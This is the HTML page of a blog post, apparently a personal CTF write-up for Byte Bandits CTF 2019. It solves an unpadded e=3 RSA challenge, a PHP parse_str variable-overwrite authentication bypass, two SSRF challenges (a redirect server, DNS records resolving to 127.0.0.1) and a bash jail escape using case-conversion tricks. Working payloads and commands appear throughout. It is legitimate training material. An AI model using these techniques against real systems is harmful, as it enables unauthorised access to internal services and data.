@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Adam ">
+<meta name="description"
+    content="First part of writeups for the Byte Bandits CTF 2019.
+RivestShamirAdleman We are given the following data:
+n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 e = 3 ciphertext ----------------------- 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333  It&amp;rsquo;s a basic RSA challenge with small public exponent (e=3) and lack of proper padding. Even though n is chosen from strong primes and it&amp;rsquo;s quite big, it is still possible to break it.
+All we need to do is to compute the third root of C (ciphertext) to get the plaintext." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:8888/posts/2019/04/bytebandits-ctf-2019-writeup-part-1/" />
+
+
+<title>
+    
+    ByteBandits CTF 2019 - writeup - part 1 ::   — Hello Friend NG Theme
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="http://localhost:8888/main.min.4d80d700c861a83e005baae4d8947d8c68519d671b71f700317d1dcbe008b2b8.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:8888/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:8888/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:8888/favicon-16x16.png">
+<link rel="manifest" href="http://localhost:8888/site.webmanifest">
+<link rel="mask-icon" href="http://localhost:8888/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="http://localhost:8888/favicon.ico">
+<meta name="msapplication-TileColor" content="#252627">
+<meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="ByteBandits CTF 2019 - writeup - part 1">
+<meta itemprop="description" content="First part of writeups for the Byte Bandits CTF 2019.
+RivestShamirAdleman We are given the following data:
+n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 e = 3 ciphertext ----------------------- 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333  It&rsquo;s a basic RSA challenge with small public exponent (e=3) and lack of proper padding. Even though n is chosen from strong primes and it&rsquo;s quite big, it is still possible to break it.
+All we need to do is to compute the third root of C (ciphertext) to get the plaintext.">
+
+
+<meta itemprop="datePublished" content="2019-04-13T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2019-04-13T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="692">
+
+
+
+<meta itemprop="keywords" content="ctf,web,crypto,misc," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://localhost:8888/"/>
+
+<meta name="twitter:title" content="ByteBandits CTF 2019 - writeup - part 1"/>
+<meta name="twitter:description" content="First part of writeups for the Byte Bandits CTF 2019.
+RivestShamirAdleman We are given the following data:
+n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 e = 3 ciphertext ----------------------- 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333  It&rsquo;s a basic RSA challenge with small public exponent (e=3) and lack of proper padding. Even though n is chosen from strong primes and it&rsquo;s quite big, it is still possible to break it.
+All we need to do is to compute the third root of C (ciphertext) to get the plaintext."/>
+
+
+
+<meta property="article:section" content="ctf" />
+
+<meta property="article:published_time" content="2019-04-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+    <div></div>
+       
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://localhost:8888/">/home/adam</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p>
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="http://localhost:8888/posts/2019/04/bytebandits-ctf-2019-writeup-part-1/">ByteBandits CTF 2019 - writeup - part 1</a></h1>
+
+            <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="http://localhost:8888/tags/ctf">ctf</a></span><span class="tag"><a href="http://localhost:8888/tags/web">web</a></span><span class="tag"><a href="http://localhost:8888/tags/crypto">crypto</a></span><span class="tag"><a href="http://localhost:8888/tags/misc">misc</a></span>
+                </p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>April 13, 2019</p>
+            </div>
+            <hr />
+
+            
+
+            <div class="post-content">
+                
+
+<p>First part of writeups for the Byte Bandits CTF 2019.</p>
+
+<h2 id="rivestshamiradleman">RivestShamirAdleman</h2>
+
+<p>We are given the following data:</p>
+
+<pre><code>n = 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623
+e = 3 
+ciphertext -----------------------
+56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333
+</code></pre>
+
+<p>It&rsquo;s a basic RSA challenge with small public exponent <code>(e=3)</code> and lack of proper padding. Even though <code>n</code> is chosen from strong primes and it&rsquo;s quite big, it is still possible to break it.</p>
+
+<p>All we need to do is to compute the third root of <code>C</code> (ciphertext) to get the plaintext. Small python script will do the trick:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://stackoverflow.com/questions/15978781/how-to-find-integer-nth-roots</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iroot</span>(k, n):
+    u, s <span style="color:#f92672">=</span> n, n<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">while</span> u <span style="color:#f92672">&lt;</span> s:
+        s <span style="color:#f92672">=</span> u
+        t <span style="color:#f92672">=</span> (k<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> s <span style="color:#f92672">+</span> n <span style="color:#f92672">//</span> pow(s, k<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+        u <span style="color:#f92672">=</span> t <span style="color:#f92672">//</span> k
+    <span style="color:#66d9ef">return</span> s
+
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333</span>
+
+d <span style="color:#f92672">=</span> iroot(<span style="color:#ae81ff">3</span>,c)
+<span style="color:#66d9ef">print</span> hex(d)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>)</code></pre></div>
+<p>Let&rsquo;s run it to get the flag:</p>
+
+<pre><code>[~]$ python2 solve.py
+flag{nO_paDDing00_rsa}
+</code></pre>
+
+<p>We can also go with the quick win with the RsaCtfTool:</p>
+
+<pre><code>$ python2 RsaCtfTool.py -n 22272129080562722886614022632205442705494455272860112814093083500097723366897651161029102178806468364810560145326674298943748926312059319333104024877629414355081997511170571841726554870330438449136414942769879449909945280622679982416961505259605748700527626064176345428348075666618966413358066674766244602120334405919054045097465042177827566762056612497539403392371174259602854649957161582616110665358774209954483243807893225011511670025850800717182535575577848500527430246259134071980979951803599863210705004134764027126983838884518704239682964897619030091789047630556807645411417077149617559860988186649846538955623 -e 3 --uncipher 56274920108122478990888092521371739605513959053322262229138771723654033167756128122086229722406180593128664696512912311575327724724695863345048713415525599333
+[+] Clear text : flag{nO_paDDing00_rsa}
+</code></pre>
+
+<h2 id="easyphp">EasyPHP</h2>
+
+<p>We are presented with the following source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$hashed_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff&#39;</span>;
+$parsed <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_url</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>]);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($parsed[<span style="color:#e6db74">&#34;query&#34;</span>])){
+    $query <span style="color:#f92672">=</span> $parsed[<span style="color:#e6db74">&#34;query&#34;</span>];
+    $parsed_query <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_str</span>($query);
+    <span style="color:#66d9ef">if</span>($parsed_query<span style="color:#f92672">!=</span><span style="color:#66d9ef">NULL</span>){
+        $action <span style="color:#f92672">=</span> $parsed_query[<span style="color:#e6db74">&#39;action&#39;</span>];
+    }
+
+    <span style="color:#66d9ef">if</span>($action<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;auth&#34;</span>){
+        $key <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;key&#34;</span>];
+        $hashed_input <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $key);
+        <span style="color:#75715e">//echo $hashed_input.&#39;\n&#39;;
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>($hashed_input<span style="color:#f92672">!==</span>$hashed_key){
+            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;GTFO!&#34;</span>);
+        }
+
+        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div>
+<p>The bug is on line <code>6</code>, where user controlled variable is being run through <code>parse_str()</code> function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$parsed_query = parse_str($query);</code></pre></div>
+<p>Regarding to the PHP manual:
+&gt; parse_str - Parses the string into variables</p>
+
+<p>Knowing that, we may assume that by controlling the <code>query</code> string we can set any variable.
+Let&rsquo;s break it down.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">[~]$ php -a
+Interactive shell
+
+php &gt; $hashed_key = &#39;79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff&#39;;
+php &gt; $query = &#34;action=auth&amp;key=aaa&#34;;
+php &gt; parse_str($query);
+php &gt; echo $action;
+auth
+php &gt; echo $key;
+aaa
+php &gt; $query = &#34;action=auth&amp;hashed_key=pwned&#34;;
+php &gt; parse_str($query);
+php &gt; echo $hashed_key;
+pwned</code></pre></div>
+<p>The solve is trival, we need to pass valid <code>key</code> and its <code>sha256</code> hash:</p>
+
+<pre><code>[~]$ echo -n test | sha256sum 
+9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
+</code></pre>
+
+<p>Final query:</p>
+
+<pre><code>?action=auth&amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&amp;key=test
+</code></pre>
+
+<p>flag:</p>
+
+<pre><code>flag{ezPz_pHp_0b9fd0f8}
+</code></pre>
+
+<h2 id="online-previewer-1">Online Previewer 1</h2>
+
+<p>By visiting the chall url we can find something that seems to be the <code>web proxy</code>:</p>
+
+<p><img src="http://localhost:8888/assets/images/byte-bandits-2019/web2.png" alt="" /></p>
+
+<p>There is a hint in the html code:</p>
+
+<p><img src="http://localhost:8888/assets/images/byte-bandits-2019/web1.png" alt="" /></p>
+
+<p>Basically, we need to do SSRF to get the flag. Problem is that any reference to localhost is being filtered by the web app:</p>
+
+<p><img src="http://localhost:8888/assets/images/byte-bandits-2019/web3.png" alt="" /></p>
+
+<p>After trying quite a few payloads, such as transforming <code>127.0.0.1</code> into integer, injecting known bypasses such as <code>0://evil.com:80,google.com:80/</code> or trying some php filters; the results were not promising. Then I realised that since I can point that proxy anywhere, I could try to use the redirection (301,302).</p>
+
+<p>I&rsquo;ve spawned a php webserver and hosted simple piece of code:</p>
+
+<pre><code>&lt;?php
+header('Location: http://127.0.0.1:1337/', true, 301);
+?&gt;
+</code></pre>
+
+<p>Then I pointed the <code>web proxy</code> to my vps ip:</p>
+
+<pre><code>adam@tmp:/tmp$ php -S 0.0.0.0:8080
+PHP 7.0.33-0+deb9u3 Development Server started at Fri Apr 12 22:47:59 2019
+Listening on http://0.0.0.0:8080
+Document root is /tmp
+Press Ctrl-C to quit.
+[Fri Apr 12 22:50:03 2019] 35.154.144.251:58234 [301]: /
+</code></pre>
+
+<p>and..</p>
+
+<p><img src="http://localhost:8888/assets/images/byte-bandits-2019/web4.png" alt="" /></p>
+
+<h2 id="online-previewer-2">Online Previewer 2</h2>
+
+<p>Additional checks were introduced into that level. I was trying a bit more sophisticated payloads or redirects but nothing worked.</p>
+
+<p>After some time I found a similar challenge: <code>list0r (web 400)</code> from <code>33c3ctf</code>. As it turned out, the challanges were very similar.</p>
+
+<p>I&rsquo;ve assigned two <code>A</code> records to my domain:</p>
+
+<pre><code>[~]$ dig [redacted].cc @8.8.8.8 A +short
+[redacted]
+127.0.0.1
+[~]$ 
+</code></pre>
+
+<p>After few tryouts I was able to recover the flag:</p>
+
+<p><img src="http://localhost:8888/assets/images/byte-bandits-2019/web5.png" alt="" /></p>
+
+<h2 id="bash-fu">Bash-fu</h2>
+
+<p>All commands are transformed into uppercase:</p>
+
+<pre><code>[~]$ nc -v 13.234.130.76 7002
+Connection to 13.234.130.76 7002 port [tcp/afs3-prserver] succeeded!
+bash: cannot set terminal process group (1): Not a tty
+bash: no job control in this shell
+bash-4.4$ id
+id
+bash: ID: command not found
+bash-4.4$ /???/???
+/???/???
+bash: /???/???: No such file or directory
+</code></pre>
+
+<p>It was possible to bypass the restrictions by using bash builtin string transformations:</p>
+
+<pre><code>bash-4.4$ a=&quot;id&quot;; ${a,,}
+a=&quot;id&quot;; ${a,,}
+uid=100(convict) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+bash-4.4$ a=&quot;ls -la /jail&quot;; ${a,,}
+a=&quot;ls -la /jail&quot;; ${a,,}
+total 16
+drwxr-xr-x    1 root     root          4096 Apr 13 03:22 .
+drwxr-xr-x    1 root     root          4096 Apr 13 03:23 ..
+-rw-r--r--    1 root     root            32 Apr 11 21:32 flag.txt
+-rwxrwxrwx    1 root     root           466 Apr 12 16:45 jail
+bash-4.4$ a=&quot;cat /jail/flag.txt&quot;; ${a,,}
+a=&quot;cat /jail/flag.txt&quot;; ${a,,}
+flag{b@$h_jails_are_3asy_p3@sy}
+</code></pre>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="http://localhost:8888/posts/2019/04/%C3%A5ngstromctf-2019/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">ångstromCTF 2019</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="http://localhost:8888/posts/2019/04/htb-redcross-local-root-basic-rop/">
+                                <span class="button__text">HTB Redcross local root (basic rop)</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+                <div>
+                    &nbsp; <a href="https://twitter.com/adamsimuntis" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a> &nbsp;&nbsp; <a href="https://github.com/asimuntis" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a> &nbsp;
+                </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="http://localhost:8888/bundle.min.9e52e68b082cf2a30a7fead88260edb8818fbd7f7831e39674917d4539ec75df41ba88eaddfbd916594ab4fb2a31913b46cf2d6094cf80381edb8c632512a8ca.js" integrity="sha512-nlLmiwgs8qMKf&#43;rYgmDtuIGPvX94MeOWdJF9RTnsdd9Buojq3fvZFllKtPsqMZE7Rs8tYJTPgDge24xjJRKoyg=="></script>
+
+
+
+    </body>
+</html>
